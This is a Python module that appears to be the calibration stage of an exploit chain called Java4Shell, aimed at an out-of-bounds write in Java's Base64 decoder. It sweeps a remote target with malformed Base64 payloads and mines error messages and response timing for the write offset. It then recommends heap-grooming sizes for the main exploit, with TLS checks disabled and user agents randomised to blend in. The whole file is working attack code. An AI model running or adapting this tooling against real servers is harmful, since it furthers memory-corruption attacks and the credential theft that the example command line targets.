# language: Python 3.10+, file: modules/calibrate.py
# Calibration mode for Java4Shell (CVE-2026-114938).
#
# Purpose
# ───────
# Before the main exploit, the exact byte offset where the OOB write lands
# on the adjacent object's header is build-dependent (JDK patch, GC, heap
# alignment).  Calibration sweeps a range of payload sizes and stray-padding
# positions to:
#
#   1. Confirm the target decodes Base64 through the vulnerable path.
#   2. Extract the OOB write offset from error message leakage when the JVM
#      exposes it (e.g. "Input byte array has wrong 4-byte ending unit" or
#      "Excess padding not allowed at byte 47").
#   3. Fall back to timing-spread analysis when no byte index leaks: the
#      payload that maximises response latency (heap stall from OOB into
#      adjacent allocation) indicates the correct offset.
#   4. Recommend `--groom-size` and `--attempts` tuning based on the
#      confirmed layout.
#
# Output
# ──────
# CalibrationResult dataclass printed to stdout in the same style as the
# rest of the exploit chain.  Offset is written to stderr as a JSON line so
# callers can capture it:
#
#   python java4shell_exploit.py https://target -O creds --mode calibrate \
#       2>calibration.json
#
# ─── Payload sweep strategy ───────────────────────────────────────────────────
#
# For each decoded_size in SWEEP_SIZES (3B … 192B in steps of 3):
#   - Build a valid Base64 string of that length
#   - Append one stray padding byte (=) to the end
#   - Also try inserting a stray = mid-chunk at byte (decoded_size - 1)
#   - Send via the highest-priority endpoint
#   - Record: status code, latency, response body, any numeric match in body
#
# Error leakage patterns we look for in the response body:
#   r"byte[^\d]{0,10}(\d+)"           → "byte #47", "byte number 47", etc.
#   r"offset[^\d]{0,10}(\d+)"         → "offset 47"
#   r"index[^\d]{0,10}(\d+)"          → "index out of bounds: 47"
#   r"position[^\d]{0,10}(\d+)"       → "position 47"
#   r"\bat\s+(\d+)\b"                 → "at 47"
#
# If multiple payloads yield the same leaked offset, that's the confirmed
# OOB landing byte.  If no leak, the payload with max latency is flagged as
# the best candidate (confidence=low).

import base64
import json
import re
import ssl
import sys
import time
import threading
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.http_utils import random_ua, jitter

# ─── Sweep parameters ────────────────────────────────────────────────────────

# Decoded payload sizes to try (bytes), must be multiples of 3 (clean Base64)
SWEEP_SIZES: list[int] = list(range(3, 195, 3))   # 3, 6, 9 … 192

# Patterns that indicate a byte/offset is leaked in the error body
_LEAK_PATTERNS: list[re.Pattern] = [
    re.compile(r"byte[^\d]{0,10}(\d+)",      re.IGNORECASE),
    re.compile(r"offset[^\d]{0,10}(\d+)",    re.IGNORECASE),
    re.compile(r"index[^\d]{0,10}(\d+)",     re.IGNORECASE),
    re.compile(r"position[^\d]{0,10}(\d+)",  re.IGNORECASE),
    re.compile(r"padding[^\d]{0,10}(\d+)",   re.IGNORECASE),
    re.compile(r"\bat\s+(\d+)\b",            re.IGNORECASE),
]

# OOB signal strings: response body must contain at least one to count as hit
_OOB_SIGNALS: list[str] = [
    "decode error",
    "illegal base64",
    "invalid base64",
    "wrong 4-byte",
    "wrong ending",
    "excess padding",
    "unexpected padding",
    "padding",          # broad fallback
]


# ─── Result dataclass ─────────────────────────────────────────────────────────

@dataclass
class ProbeResult:
    decoded_size: int
    payload:      str
    variant:      str           # "trail" | "mid"
    status_code:  Optional[int] = None
    latency_ms:   float = 0.0
    body:         str = ""
    error:        Optional[str] = None
    oob_signal:   bool = False
    leaked_offset: Optional[int] = None


@dataclass
class CalibrationResult:
    target:              str = ""
    # Offset conclusions
    confirmed_offset:    Optional[int] = None   # from error leak
    candidate_offset:    Optional[int] = None   # from timing if no leak
    confidence:          str = "none"           # none | low | medium | high
    # Best payload
    best_payload:        str = ""
    best_decoded_size:   int = 0
    best_variant:        str = ""
    # Sweep stats
    total_probes:        int = 0
    oob_hit_count:       int = 0
    leak_hit_count:      int = 0
    baseline_ms:         float = 0.0
    max_latency_ms:      float = 0.0
    # Recommendations
    recommended_groom_size:   int = 0
    recommended_attempts:     int = 5
    # Raw probes (for verbose / JSON output)
    probes:              list[ProbeResult] = field(default_factory=list)
    notes:               list[str] = field(default_factory=list)


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _build_probe_payloads(decoded_size: int) -> list[tuple[str, str]]:
    """
    Returns [(payload_str, variant_name), ...] for a given decoded_size.
    variant: "trail" = stray = at end; "mid" = stray = mid-chunk
    """
    raw   = b"\x41" * decoded_size
    valid = base64.b64encode(raw).decode().rstrip("=")
    out   = []

    # trailing stray padding — most common trigger
    out.append((valid + "=",  "trail"))
    out.append((valid + "==", "trail2"))

    # mid-chunk injection: insert = at last full 4-char boundary before end
    # e.g. "QUFQ" + "=" + rest — the decoder processes the mid-stray as excess
    if len(valid) >= 8:
        cut = (len(valid) // 4 - 1) * 4
        mid = valid[:cut] + "=" + valid[cut:]
        out.append((mid, "mid"))

    return out


def _extract_offset(body: str) -> Optional[int]:
    """Try all leak patterns; return first matched integer or None."""
    for pat in _LEAK_PATTERNS:
        m = pat.search(body)
        if m:
            try:
                return int(m.group(1))
            except (ValueError, IndexError):
                pass
    return None


def _has_oob_signal(body: str) -> bool:
    lo = body.lower()
    return any(sig in lo for sig in _OOB_SIGNALS)


def _send_probe(url: str, payload: str, method: str, ct: str,
                body_template: Optional[str], extra_headers: dict,
                timeout: float) -> tuple[float, int, str, Optional[str]]:
    """
    Returns (latency_ms, status_code, body_snippet, error).
    status_code is 0 on network error.
    """
    p_str = payload
    if body_template:
        body_bytes = body_template.replace("{PAYLOAD}", p_str).encode()
    else:
        body_bytes = f'{{"data":"{p_str}"}}'.encode()

    headers = {
        "User-Agent":   random_ua(),
        "Content-Type": ct,
        **extra_headers,
    }
    if method in ("GET", "HEAD"):
        body_bytes = None

    req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            elapsed = (time.perf_counter() - t0) * 1000
            snippet = r.read(1024).decode(errors="replace")
            return elapsed, r.status, snippet, None
    except urllib.error.HTTPError as e:
        elapsed = (time.perf_counter() - t0) * 1000
        try:
            snippet = e.read(1024).decode(errors="replace")
        except Exception:
            snippet = ""
        return elapsed, e.code, snippet, None
    except Exception as ex:
        elapsed = (time.perf_counter() - t0) * 1000
        return elapsed, 0, "", str(ex)


# ─── Baseline ────────────────────────────────────────────────────────────────

def _measure_baseline(url: str, timeout: float, n: int = 5) -> float:
    """Send n benign valid Base64 requests; return median latency in ms."""
    import statistics
    raw   = b"\x57" * 48
    valid = base64.b64encode(raw).decode()
    times = []
    for _ in range(n):
        t0 = time.perf_counter()
        try:
            req = urllib.request.Request(
                url, data=f'{{"data":"{valid}"}}'.encode(),
                headers={"User-Agent": random_ua(), "Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()):
                pass
        except Exception:
            pass
        times.append((time.perf_counter() - t0) * 1000)
    if not times:
        return 0.0
    return statistics.median(times)


# ─── Core sweep ──────────────────────────────────────────────────────────────

def run_calibration(fp: FingerprintResult,
                    timeout: float = 10.0,
                    threads: int = 4,
                    verbose: bool = False,
                    jitter_max_ms: float = 0.0) -> CalibrationResult:
    """
    Run the full calibration sweep and return a CalibrationResult.
    Writes a JSON summary line to stderr on completion.
    """
    result = CalibrationResult(target=fp.target_url)

    if not fp.reachable or not fp.profile:
        result.notes.append("Target not reachable or profile not detected — calibration aborted.")
        return result

    # Pick highest-priority endpoint
    endpoint      = sorted(fp.profile.endpoints, key=lambda e: e["priority"])[0]
    path          = endpoint.get("path", "/")
    method        = endpoint.get("method", "POST")
    ct            = endpoint.get("extra_headers", {}).get("Content-Type", "application/json")
    body_template = endpoint.get("body_template")
    extra_headers = {k: v for k, v in endpoint.get("extra_headers", {}).items()
                     if k.lower() != "content-type"}
    url           = fp.target_url.rstrip("/") + path

    # Baseline
    result.baseline_ms = _measure_baseline(url, timeout)

    # Build all probe specs: (decoded_size, payload_str, variant)
    probe_specs: list[tuple[int, str, str]] = []
    for sz in SWEEP_SIZES:
        for payload, variant in _build_probe_payloads(sz):
            probe_specs.append((sz, payload, variant))

    result.total_probes = len(probe_specs)

    # Execute sweep (bounded concurrency — too many threads spike GC noise)
    lock = threading.Lock()

    def _run_one(spec: tuple[int, str, str]) -> ProbeResult:
        sz, payload, variant = spec
        jitter(0, jitter_max_ms)
        lat, code, body, err = _send_probe(url, payload, method, ct,
                                           body_template, extra_headers, timeout)
        pr = ProbeResult(
            decoded_size=sz, payload=payload, variant=variant,
            status_code=code, latency_ms=lat, body=body[:400], error=err,
        )
        pr.oob_signal    = _has_oob_signal(body)
        pr.leaked_offset = _extract_offset(body) if pr.oob_signal else None
        return pr

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(_run_one, spec): spec for spec in probe_specs}
        for future in as_completed(futures):
            pr = future.result()
            with lock:
                result.probes.append(pr)
                if pr.oob_signal:
                    result.oob_hit_count += 1
                if pr.leaked_offset is not None:
                    result.leak_hit_count += 1
                if pr.latency_ms > result.max_latency_ms:
                    result.max_latency_ms = pr.latency_ms

    # ── Offset inference ─────────────────────────────────────────────────────

    # Method A: direct leak — if multiple probes agree on the same offset, trust it
    leak_votes: dict[int, list[ProbeResult]] = {}
    for pr in result.probes:
        if pr.leaked_offset is not None:
            leak_votes.setdefault(pr.leaked_offset, []).append(pr)

    if leak_votes:
        # Pick the offset with the most votes; ties broken by smallest offset
        best_offset = max(leak_votes, key=lambda o: (len(leak_votes[o]), -o))
        result.confirmed_offset = best_offset
        result.confidence = "high" if len(leak_votes[best_offset]) >= 3 else "medium"
        # Best payload: largest decoded_size that yielded the confirmed offset
        best_pr = max(
            (pr for pr in leak_votes[best_offset]),
            key=lambda pr: pr.decoded_size,
        )
        result.best_payload      = best_pr.payload
        result.best_decoded_size = best_pr.decoded_size
        result.best_variant      = best_pr.variant
        result.notes.append(
            f"Offset {best_offset} confirmed from error message leakage "
            f"({len(leak_votes[best_offset])} probes agreed)."
        )
    else:
        # Method B: timing spread — the probe with max latency over baseline
        # is likely the one that caused an OOB-induced GC stall
        oob_probes = [pr for pr in result.probes if pr.oob_signal and pr.latency_ms > 0]
        if oob_probes and result.baseline_ms > 0:
            # Sort by latency delta descending
            by_lat = sorted(oob_probes, key=lambda pr: pr.latency_ms, reverse=True)
            top    = by_lat[0]
            ratio  = top.latency_ms / result.baseline_ms if result.baseline_ms else 0
            if ratio >= 3.0:
                # Infer offset from decoded_size + header size
                hdr = fp.obj_header_size or 16
                inferred = (top.decoded_size % 8) + (hdr - 4)
                result.candidate_offset  = inferred
                result.confidence        = "low"
                result.best_payload      = top.payload
                result.best_decoded_size = top.decoded_size
                result.best_variant      = top.variant
                result.notes.append(
                    f"No offset leak found. Timing-inferred offset: {inferred} "
                    f"(latency {top.latency_ms:.0f}ms vs baseline {result.baseline_ms:.0f}ms, "
                    f"ratio={ratio:.1f}×). Use --verbose to inspect."
                )
            else:
                result.notes.append(
                    "No offset leak and no significant timing spike. "
                    "Target may be patched, WAF-filtered, or not decoding Base64 inline."
                )
        else:
            result.notes.append(
                "No OOB signals detected in sweep. Target may not be vulnerable "
                "or the endpoint does not reach java.util.Base64.getDecoder()."
            )

    # ── Grooming size recommendation ─────────────────────────────────────────
    # Optimal victim object: slightly larger than the OOB write range (~63B for AVX,
    # ~15B for scalar).  Align to 8 bytes; Java object minimum 16B.
    confirmed = result.confirmed_offset or result.candidate_offset
    if confirmed is not None:
        oob_range = fp.oob_write_bytes or 63
        # Victim array should start exactly `confirmed` bytes into the OOB range
        # and have a minimum 128B allocation so its header is fully within range.
        victim_size = max(128, ((confirmed + oob_range + 15) // 16) * 16)
        result.recommended_groom_size = victim_size
        result.recommended_attempts   = 10 if result.confidence == "low" else 5
        result.notes.append(
            f"Recommended victim object size: {victim_size}B. "
            f"Use --groom-threads 40 and --attempts {result.recommended_attempts}."
        )

    # ── Write JSON to stderr ──────────────────────────────────────────────────
    summary = {
        "mode":               "calibrate",
        "target":             result.target,
        "confirmed_offset":   result.confirmed_offset,
        "candidate_offset":   result.candidate_offset,
        "confidence":         result.confidence,
        "oob_hit_count":      result.oob_hit_count,
        "leak_hit_count":     result.leak_hit_count,
        "baseline_ms":        round(result.baseline_ms, 1),
        "max_latency_ms":     round(result.max_latency_ms, 1),
        "best_payload":       result.best_payload,
        "best_decoded_size":  result.best_decoded_size,
        "recommended_groom_size": result.recommended_groom_size,
        "recommended_attempts":   result.recommended_attempts,
        "notes":              result.notes,
    }
    print(json.dumps(summary), file=sys.stderr)

    return result


# ─── Printer ─────────────────────────────────────────────────────────────────

def print_calibration(result: CalibrationResult,
                      verbose: bool = False,
                      use_color: bool = True) -> None:
    RED  = "\033[91m" if use_color else ""
    GRN  = "\033[92m" if use_color else ""
    YLW  = "\033[93m" if use_color else ""
    CYN  = "\033[96m" if use_color else ""
    BOLD = "\033[1m"  if use_color else ""
    RST  = "\033[0m"  if use_color else ""

    print(f"\n  {BOLD}── Calibration Results ──{RST}")
    print(f"  Target         : {result.target}")
    print(f"  Probes sent    : {result.total_probes}")
    print(f"  OOB signals    : {result.oob_hit_count}")
    print(f"  Offset leaks   : {result.leak_hit_count}")
    print(f"  Baseline       : {result.baseline_ms:.1f}ms")
    print(f"  Max latency    : {result.max_latency_ms:.1f}ms")

    if result.confirmed_offset is not None:
        print(f"  Confirmed offset  : {GRN}byte #{result.confirmed_offset}{RST}  "
              f"(confidence: {GRN}{result.confidence}{RST})")
    elif result.candidate_offset is not None:
        print(f"  Candidate offset  : {YLW}byte #{result.candidate_offset}{RST}  "
              f"(confidence: {YLW}{result.confidence}{RST}  — timing-inferred)")
    else:
        print(f"  Offset            : {RED}undetermined{RST}")

    if result.best_payload:
        preview = result.best_payload[:40] + ("..." if len(result.best_payload) > 40 else "")
        print(f"  Best payload      : {preview!r}  "
              f"(decoded={result.best_decoded_size}B, variant={result.best_variant})")

    if result.recommended_groom_size:
        print(f"\n  {CYN}Recommendations:{RST}")
        print(f"    --groom-size not yet a flag — use victim size {result.recommended_groom_size}B")
        print(f"    --attempts {result.recommended_attempts}")
        print(f"    --warmup 500  (if AVX-512 VBMI absent)")

    print()
    for note in result.notes:
        print(f"  → {note}")
    print()

    if verbose:
        # Print top 10 hits sorted by latency
        hits = sorted(
            [pr for pr in result.probes if pr.oob_signal],
            key=lambda pr: pr.latency_ms, reverse=True
        )[:10]
        if hits:
            print(f"  {BOLD}Top OOB hits by latency:{RST}")
            for pr in hits:
                leak_str = f"  leak={pr.leaked_offset}" if pr.leaked_offset is not None else ""
                print(f"    sz={pr.decoded_size:4d}B  {pr.variant:7s}  "
                      f"{pr.latency_ms:7.1f}ms  "
                      f"status={pr.status_code}{leak_str}")
            print()
